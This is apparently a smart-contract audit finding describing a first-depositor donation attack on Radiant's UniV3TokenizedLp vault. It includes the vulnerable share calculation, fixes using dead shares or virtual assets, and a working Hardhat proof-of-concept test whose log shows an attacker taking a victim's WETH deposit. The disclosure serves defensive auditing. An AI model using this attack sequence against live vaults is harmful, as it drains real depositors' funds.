---
tags:
  - lang/solidity
  - sector/dex
  - sector/oracle
  - sector/stable
  - sector/vault
  - platform/pashov
  - has/github
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Radiant]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Radiant-security-review-June.md"
genome:
  - "[[precision-loss]]"
  - "[[direct-drain]]"
  - "[[chainlink-round-completeness]]"
---
# [H-01] `UniV3TokenizedLp` can be attacked by an initial donation

- id: 36369
- impact: HIGH
- protocol: [[Radiant June]]
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Radiant-security-review-June.md

## Summary


This bug report describes a high severity issue that can potentially impact users of the `UniV3TokenizedLp` contract. When there are no user deposits, the first user can mint a very small amount of LP and then transfer a large amount of WETH to the contract. This results in a mismatch between the total supply of LP and the actual assets in the pool. This can lead to the assets being stolen when the attacker calls the `withdraw` function. The report suggests a circumvent solution and also recommends using virtual assets and virtual shares. A proof of concept (PoC) code is also provided to demonstrate the issue. 

## Details

**Severity**

**Impact:** High

**Likelihood:** Medium

**Description**

When `UniV3TokenizedLp` has no user deposit, the first user can mint `1` wei LP, and then transfer `1e18` WETH to the `UniV3TokenizedLp` contract. This results in `totalSupply` being 1 while the value of the assets in the pool is very high.

Then, after the new user transfers the asset, it may mint 0 LP due to division loss. These assets will all be counted as assets held by the 1wei LP and will eventually be stolen when the attacker calls `withdraw`.

```solidity
		if (totalSupply() != 0) {
			// Price the pool0 in token1 at oracle price
			uint256 pool0PricedInToken1 = (pool0 * oraclePrice) / PRECISION;
			// Compute ratio of total shares to pool AUM in token1
			shares = (shares * totalSupply()) / (pool0PricedInToken1 + pool1);
		}
```

**Recommendations**

This is a circumvent solution. In the same block, deploy `UniV3TokenizedLp` and deposit some LPs to address `0`.

Or use virtual assets and virtual shares. Please refer to https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks.

**Appendix: PoC**

```diff
diff --git a/test/zap/uniV3tokenizedLP.test.ts b/test/zap/uniV3tokenizedLP.test.ts
index b6e17af9..3b02a607 100644
--- a/test/zap/uniV3tokenizedLP.test.ts
+++ b/test/zap/uniV3tokenizedLP.test.ts
@@ -162,6 +162,88 @@ describe('UniV3TokenizedLP:', function () {
                };
        }

+       it('UniV3TokenizedLp initial donation attack poc', async () => {
+               // 1. Init poc env
+               console.log(">>>>> Init poc env");
+               const tokenFactory = await ethers.getContractFactory('MockToken');
+               const usdc = await tokenFactory.deploy('USD Coin', 'USDC', 6);
+               const weth = await tokenFactory.deploy('Wrapped Ether', 'WETH', 18);
+               const {factory, router, quoter, createAndFundPool} = await uniV3CoreFixture(weth.address);
+               const [creator, user1, user2, user3] = await ethers.getSigners();
+               await weth.mint(creator.address, POOL_WETH_RESERVE);
+               await usdc.mint(creator.address, POOL_USDC_RESERVE);
+               const poolAddr = await createAndFundPool(
+                       creator,
+                       usdc,
+                       weth,
+                       POOL_FEE_TIER,
+                       POOL_USDC_RESERVE,
+                       POOL_WETH_RESERVE
+               );
+               const samplePool = await ethers.getContractAt('UniswapV3Pool', poolAddr);
+               const MockOracleFactory = await ethers.getContractFactory('MockChainlinkAggregator');
+               const wethUsdOracle = await MockOracleFactory.deploy(ethers.utils.parseUnits(FAKE_WETH_USD_PRICE, 8));
+               const usdcUsdOracle = await MockOracleFactory.deploy(ethers.utils.parseUnits('1', 8));
+               const uniV3PoolMath = await (await ethers.getContractFactory('UniV3PoolMath')).deploy();
+               const tokenizedLPFactory = await ethers.getContractFactory('UniV3TokenizedLp', {
+                       libraries: {UniV3PoolMath: uniV3PoolMath.address},
+               });
+               const uV3TokenizedLp: UniV3TokenizedLp = <UniV3TokenizedLp>(
+                       await upgrades.deployProxy(
+                               tokenizedLPFactory,
+                               [
+                                       samplePool.address,
+                                       true,
+                                       true,
+                                       Number(usdc.address) < Number(weth.address) ? usdcUsdOracle.address : wethUsdOracle.address,
+                                       Number(usdc.address) < Number(weth.address) ? wethUsdOracle.address : usdcUsdOracle.address,
+                               ],
+                               {initializer: 'initialize', unsafeAllow: ['constructor', 'external-library-linking']}
+                       )
+               );
+
+               await weth.mint(user1.address, ethers.utils.parseUnits('10', 18));
+               await weth.mint(user2.address, ethers.utils.parseUnits('10', 18));
+               console.log(">> user1's WETH balance: " + await weth.balanceOf(user1.address));
+               console.log(">> user2's WETH balance: " + await weth.balanceOf(user2.address));
+               console.log();
+
+               // 2. user1 deposit 1 wei WETH and transfer 1e18 WETH to `uV3TokenizedLp`
+               console.log(">>>>> user1 deposit 1 wei WETH and transfer 1e18 WETH to `uV3TokenizedLp`");
+               const wethIsToken0 = Number(weth.address) < Number(usdc.address)
+               await weth.connect(user1).approve(uV3TokenizedLp.address, ethers.constants.MaxUint256);
+               if (wethIsToken0) {
+                       await uV3TokenizedLp.connect(user1).deposit(1, 0, user1.address);
+               } else {
+                       await uV3TokenizedLp.connect(user1).deposit(0, 1, user1.address);
+               }
+
+               await weth.connect(user1).transfer(uV3TokenizedLp.address, ethers.utils.parseUnits('1', 18));
+
+               console.log(">> user1's LP balance: " + await uV3TokenizedLp.balanceOf(user1.address));
+               console.log(">> LP totalSupply: " + await uV3TokenizedLp.totalSupply());
+               console.log();
+
+               // 3. user2 deposit 0.5e18 WETH but receive 0 LP
+               console.log(">>>>> user2 deposit 0.5e18 WETH but receive 0 LP");
+               await weth.connect(user2).approve(uV3TokenizedLp.address, ethers.constants.MaxUint256);
+               if (wethIsToken0) {
+                       await uV3TokenizedLp.connect(user2).deposit(ethers.utils.parseUnits('0.5', 18), 0, user2.address);
+               } else {
+                       await uV3TokenizedLp.connect(user2).deposit(0, ethers.utils.parseUnits('0.5', 18), user2.address);
+               }
+
+               console.log(">> user2's LP balance: " + await uV3TokenizedLp.balanceOf(user2.address));
+               console.log();
+
+               // 4. user1 withdraw 1 wei LP
+               console.log(">>>>> user1 withdraw 1 wei LP");
+               await uV3TokenizedLp.connect(user1).withdraw(1, user1.address);
+               console.log(">> user1's WETH balance: " + await weth.balanceOf(user1.address));
+               console.log(">> user2's WETH balance: " + await weth.balanceOf(user2.address));
+               console.log();
+       });
+
        it('should check uV3TokenizedLp was properly initialized', async () => {
                const {uV3TokenizedLp, usdc, weth, samplePool, creator} = await loadFixture(setupFixture);
                const token0Addr = await uV3TokenizedLp.token0();
```

Run the PoC

```bash
yarn hardhat test --grep "UniV3TokenizedLp initial donation attack poc"
```

The log

```bash
$ yarn hardhat test --grep "UniV3TokenizedLp initial donation attack poc"
Warning: All subsequent Upgrades warnings will be silenced.

    Make sure you have manually checked all uses of unsafe flags.

  UniV3TokenizedLP:
>>>>> Init poc env
>> user1's WETH balance: 10000000000000000000
>> user2's WETH balance: 10000000000000000000

>>>>> user1 deposit 1 wei WETH and transfer 1e18 WETH to `uV3TokenizedLp`
>> user1's LP balance: 1
>> LP totalSupply: 1

>>>>> user2 deposit 0.5e18 WETH but receive 0 LP
>> user2's LP balance: 0

>>>>> user1 withdraw 1 wei LP
>> user1's WETH balance: 10500000000000000000
>> user2's WETH balance: 9500000000000000000

    ✔ UniV3TokenizedLp initial donation attack poc (10677ms)

  1 passing (16s)

```
